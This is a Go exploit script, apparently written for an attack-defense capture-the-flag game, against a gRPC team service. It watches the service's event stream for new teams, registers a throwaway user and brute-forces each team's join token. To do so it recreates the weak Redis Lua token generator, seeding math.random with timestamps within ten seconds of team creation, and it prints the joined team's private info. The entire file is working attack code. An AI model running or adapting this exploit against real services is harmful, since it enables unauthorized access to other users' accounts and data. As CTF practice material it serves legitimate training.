package main

import (
	"context"
	"fmt"
	"github.com/bxcodec/faker/v3"
	"github.com/go-redis/redis/v8"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
	"os"
	pb "sploits/pb"
	"strconv"
	"time"
)

func getRedisHashes(ts time.Time) []string {
	redisAddr := os.Getenv("REDIS")
	if redisAddr == "" {
		fmt.Println("Need redis addr in env REDIS")
		os.Exit(1)
	}

	rdb := redis.NewClient(&redis.Options{
		Addr: redisAddr,
	})

	ts = ts.Add(- 10 * time.Second)
	var codes []string

	// go to range [-10 seconds ... ts ... +10 seconds]
	for i := 0; i < 21; i++ {
		result := rdb.Eval(
			context.Background(),
			"local secs = KEYS[1] math.randomseed(secs) local rnd = math.random() return redis.sha1hex(rnd)",
			[]string{strconv.Itoa(int(ts.Unix()))})
		if result.Err() != nil {
			return []string{}
		}

		code, _ := result.Result()
		codes = append(codes, code.(string))
		ts = ts.Add(1 * time.Second)
	}

	return codes
}

func sploitCreateTeam(client pb.ApiClient, team string, ts time.Time) {
	user := faker.Username()
	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		Username: user,
		Password: faker.Password(),
	})
	if err != nil {
		return
	}

	ctx := metadata.AppendToOutgoingContext(
		context.Background(),
		"authorization",
		fmt.Sprintf("%s:%s", user, resp.Token),
	)
	codes := getRedisHashes(ts)
	fmt.Println("Got potential join tokens")
	for _, code := range codes {
		_, err := client.JoinTeam(ctx, &pb.JoinTeamRequest{
			Name:  team,
			Token: code,
		})
		if err != nil {
			continue
		}

		info, err := client.Info(ctx, &pb.InfoRequest{})
		if err != nil {
			return
		}

		fmt.Println(info.TeamInfo)
	}
}

func main() {
	ip := os.Args[1]
	conn, err := grpc.Dial(fmt.Sprintf("%s:%v", ip, 2020), grpc.WithInsecure())
	if err != nil {
		return
	}
	defer conn.Close()

	client := pb.NewApiClient(conn)

	eventsClient, err := client.Events(context.Background(), &pb.EventsRequest{})
	if err != nil {
		return
	}

	fmt.Println("Connected to events stream")
	for {
		e, err := eventsClient.Recv()
		if err != nil {
			return
		}

		if e.Type == pb.Event_create {
			fmt.Println("Found register team event")

			team := e.Team
			ts := e.Timestamp.AsTime()

			go sploitCreateTeam(client, team, ts)
		}
	}
}
